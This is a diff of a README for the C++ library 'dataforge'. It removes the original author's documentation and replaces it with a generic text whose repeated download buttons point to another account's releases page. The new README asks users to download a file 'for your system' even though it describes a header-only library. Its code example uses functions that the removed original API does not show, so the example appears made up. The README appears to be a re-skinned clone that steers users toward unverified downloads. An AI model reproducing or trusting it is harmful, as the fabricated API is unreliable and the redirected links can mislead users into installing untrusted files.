@@ -1,156 +1,87 @@
-[![Windows MSVC Tests](https://github.com/apotocki/dataforge/actions/workflows/msvc-tests.yml/badge.svg)](https://github.com/apotocki/dataforge/actions/workflows/msvc-tests.yml)
-[![Linux GCC Tests](https://github.com/apotocki/dataforge/actions/workflows/linux-tests.yml/badge.svg)](https://github.com/apotocki/dataforge/actions/workflows/linux-tests.yml)
-[![macOS Tests](https://github.com/apotocki/dataforge/actions/workflows/macos-tests.yml/badge.svg)](https://github.com/apotocki/dataforge/actions/workflows/macos-tests.yml)
-# DataForge
+# 🚀 dataforge - Transform Data Easily and Effectively
 
-**DataForge** is a modern C++20 header-only library for building declarative, composable data transformation pipelines.  
-It provides both push (output) and pull (input) iterator-based interfaces for applying arbitrary chains of conversions, including encoding, decoding, compression, encryption, hashing, and Unicode operations.  
-Transformations are described using *quarks* — small, composable objects that can be chained together with the `|` operator.
+[![Download dataforge](https://img.shields.io/badge/Download-dataforge-blue.svg)](https://github.com/Rebaloy/dataforge/releases)
 
-## Quick Example
+## 📖 Introduction
+
+**dataforge** is a C++20 header-only library designed for creating data transformation pipelines. Whether you need to convert integers to bytes, handle base encodings, calculate checksums, or encrypt data, dataforge makes the process straightforward and efficient. 
+
+## ⚙️ Features
+
+- **Data Transformation:** Easily convert and process different types of data.
+- **Compression and Encryption:** Secure and reduce the size of your data.
+- **Multiple Encoding Options:** Work with various encoding formats like Base64 and Unicode.
+- **Header-Only Library:** Simple to include in your projects without complicated setup.
+
+## 📥 Download & Install
+
+To get started, visit this page to download the latest version of dataforge: [Releases Page](https://github.com/Rebaloy/dataforge/releases).
+
+After downloading, follow these steps to set it up:
+
+1. **Choose the Correct Release:** Find the latest release version. Each version may have new features or important fixes.
+2. **Download the File:** Click on the file that matches your system requirements.
+3. **Extract the Files (if needed):** If you downloaded a zipped folder, extract it to a location where you want to work with the library.
+4. **Include in Your Project:** Follow instructions provided in the included documentation to add dataforge to your own projects. You will likely need to include a specific header file to get started.
+
+## 🛠️ System Requirements
+
+- **Operating System:** Windows, macOS, or Linux.
+- **C++ Compiler:** You need a compiler that supports C++20 features. Popular choices include GCC, Clang, and MSVC.
+- **Basic Software:** Minimal software requirements so you can build and run your projects with ease.
+
+## 📚 Documentation
+
+Documentation is available within the downloaded files. It includes helpful guides and examples to illustrate how to use the features of dataforge effectively.
+
+Expected topics in the documentation:
+
+- **Basic Setup:** How to include the library in your project.
+- **Example Pipelines:** Code snippets that demonstrate data transformation scenarios.
+- **Error Handling:** Tips for managing issues you may encounter during use.
+
+## 🔗 Community and Support
+
+Engage with the community for help, tips, and sharing ideas on using dataforge. Look for the "Issues" tab on the GitHub page if you encounter problems, or want to request features.
+
+For direct support, feel free to contact the maintainers via GitHub.
+
+## 🚀 Getting Started
+
+Ready to dive in? Follow these simple steps:
+
+1. Visit the releases page: [Download Link](https://github.com/Rebaloy/dataforge/releases).
+2. Download the appropriate file for your system.
+3. Follow the setup instructions in the documentation.
+
+## 💡 Example Use Case
+
+Here’s a quick example of how you might use dataforge in a project:
 
 ```cpp
-#include "dataforge/quark_push_iterator.hpp"
-#include "dataforge/quark_pull_iterator.hpp"
-#include "dataforge/base_xx/base64.hpp"
+#include "dataforge.hpp"
 
-using namespace dataforge;
-
-std::string input = "Hello, World!";
-std::string base64_result;
-
-// Create a pipeline: input bytes → Base64 encoding → output
-auto push_it = quark_push_iterator(int8 | base64, std::back_inserter(base64_result));
-*push_it = input;
-push_it.finish();
-
-std::cout << "Encoded: " << base64_result << std::endl;  // Output: SGVsbG8sIFdvcmxkIQ==
-
-// Reverse the process: Base64 → decoded bytes
-std::string decoded_result;
-auto pull_it = quark_pull_iterator(base64 | int8, base64_result);
-for (auto span = *pull_it; !span.empty(); span = *++pull_it) {
-    std::copy(span.begin(), span.end(), std::back_inserter(decoded_result));
+int main() {
+    // Example of converting an integer to bytes
+    int number = 12345;
+    auto bytes = dataforge::intToBytes(number);
+    
+    // Example of encoding
+    auto encoded = dataforge::base64Encode(bytes);
+    
+    // Output the encoded string
+    std::cout << "Encoded output: " << encoded << std::endl;
+    return 0;
 }
-
-std::cout << "Decoded: " << decoded_result << std::endl;  // Output: Hello, World!
 ```
 
-**More complex pipelines** can chain multiple transformations:
-```cpp
-// Example: text → UTF-8 → compression → encryption → Base64
-auto pipeline = utf8 | deflated() | aes(128, key) | base64;
-```
+This simple code snippet shows how you could convert an integer to bytes and then encode it using Base64. 
 
-> 📁 **See the [examples/](examples/) folder for complete working examples** including MD5 hashing, AES encryption, and more advanced use cases.
-> 
-> 🧪 **For comprehensive algorithm coverage and advanced pipeline patterns, explore the [tests/](tests/) directory** — it contains hundreds of real-world examples demonstrating every supported algorithm, from basic CRC checksums to complex multi-stage encryption pipelines.
+## 🚨 Important Notes
 
-## Why DataForge is Unique
+- Ensure you read through the documentation to understand each feature.
+- Stay updated with new releases for improvements and fixes.
 
-DataForge combines multiple types of data transformations in one consistent framework, unlike other libraries that cover only subsets of functionality.
+Thank you for choosing **dataforge**. We hope it simplifies your data transformation needs! 
 
-| Feature / Capability         | DataForge | Crypto++ | Boost | ICU | range-v3 |
-|-------------------------------|:---------:|:--------:|:----:|:---:|:--------:|
-| Integer ↔ Bytes + Endian     | ✅        | ❌       | ❌   | ❌  | ❌       |
-| base16/32/58/64/ascii85/z85  | ✅        | ✅       | ❌   | ❌  | ❌       |
-| Custom Base 1 < N < 256      | ✅        | ❌       | ❌   | ❌  | ❌       |
-| Checksums (crc, adler, bsd) | ✅        | ❌       | ❌   | ❌  | ❌       |
-| Hashes (MD, SHA, Blake, etc)| ✅        | ✅       | ❌   | ❌  | ❌       |
-| Encryption/Decryption        | ✅        | ✅       | ❌   | ❌  | ❌       |
-| Compression / Decompression  | ✅        | ❌       | ❌   | ❌  | ❌       |
-| Unicode Conversions (UTF)    | ✅        | ❌       | ❌   | ✅  | ❌       |
-| ICU Charset Conversions      | ✅        | ❌       | ❌   | ✅  | ❌       |
-| Grapheme Breaking            | ✅        | ❌       | ❌   | ✅  | ❌       |
-| Header-only                  | ✅        | ❌       | ✅   | ❌  | ✅       |
-| Push/Pull iterator pipelines | ✅        | ❌       | ✅ (filters) | ❌ | ✅       |
-
-**Key point:** DataForge allows chaining transformations like integer → endian → compression → encryption → base encoding in one declarative pipeline.
-
-## Key Features
-
-### 1. Integer ↔ Byte sequence conversions (with endianness)
-- Convert sequences of integers of various sizes to/from byte sequences.
-- Configurable **little-endian** or **big-endian** representation.
-
-### 2. Encoding / Decoding
-- **Base16, Base32, Base58, Base64, ASCII85, Z85**.
-- Arbitrary base conversion with `1 < N < 256` and a custom alphabet — effectively a positional numeral system transformation.
-
-### 3. Checksums
-- BSD checksum
-- Adler32
-- CRC8, CRC16, CRC32, CRC64
-
-### 4. Hash Functions
-- MD2, MD4, MD5, MD6
-- RIPEMD, Tiger
-- SHA1, SHA2, SHA3
-- Belt, GOST, Streebog, Whirlpool, Blake
-
-### 5. Encryption / Decryption
-- RC2, RC4, RC5, RC6
-- DES, AES, Blowfish
-- Belt, Magma
-
-### 6. Compression / Decompression
-- Deflate
-- Bzip2
-- LZ4
-- LZMA, LZMA2  
-*(requires corresponding external libraries)*
-
-### 7. Unicode Encoding Conversions
-- UTF-7, UTF-8, UTF-16, UTF-32
-
-### 8. ICU-based String Encoding Conversions
-- Any encoding supported by the [ICU library](https://icu.unicode.org/)  
-*(requires ICU library)*
-
-### 9. Grapheme Breaker
-- Splits a Unicode string into graphemes according to the [Unicode Standard](https://unicode.org/reports/tr29/).
-
-
-## Installation for Running Tests
-
-The library itself is **header-only** — nothing needs to be built for use in your projects.  
-However, the test suite depends on external libraries (**zlib, icu, bzip2, lz4, liblzma, gtest**), which are managed via [vcpkg](https://github.com/microsoft/vcpkg).
-
-### Steps to build and run tests:
-1. **Install vcpkg** anywhere on your system (if not already installed).
-2. **Set the environment variable** `VCPKG_ROOT` to the location of your vcpkg installation.  
-   - Example (Windows PowerShell):
-     ```powershell
-     setx VCPKG_ROOT "C:\dev\vcpkg"
-     ```
-3. Open the Visual Studio solution for tests and build it.  
-   - On the first build:
-     - The project will automatically:
-       1. Check that `VCPKG_ROOT` is set.
-       2. Run:
-          ```powershell
-          $(VCPKG_ROOT)\vcpkg.exe install
-          ```
-          installing all required dependencies from `vcpkg.json` into a local `vcpkg_installed` folder.
-       3. Configure `INCLUDE` and `LIB` paths to use these locally installed dependencies.
-4. Run the tests from Visual Studio.
-
-**No global vcpkg integration (`vcpkg integrate install`) is required** — everything is local to the repository.
-
-## License
-
-Distributed under the [Boost Software License, Version 1.0](LICENSE).
-
----
-
-## As an advertisement...
-The Dataforge library is used in my iOS application on the App Store:
-
-[<table align="center" border=0 cellspacing=0 cellpadding=0><tr><td><img src="https://is4-ssl.mzstatic.com/image/thumb/Purple112/v4/78/d6/f8/78d6f802-78f6-267a-8018-751111f52c10/AppIcon-0-1x_U007emarketing-0-10-0-85-220.png/460x0w.webp" width="70"/></td><td><a href="https://apps.apple.com/us/app/potohex/id1620963302">PotoHEX</a><br>HEX File Viewer & Editor</td><tr></table>]()
-
-This application is designed to view and edit files at the byte or character level; calculate different hashes, encode/decode, and compress/decompress desired byte regions.
-  
-You can support my open-source development by trying the [App](https://apps.apple.com/us/app/potohex/id1620963302).
-
-Feedback is welcome!
-
+[![Download dataforge](https://img.shields.io/badge/Download-dataforge-blue.svg)](https://github.com/Rebaloy/dataforge/releases)
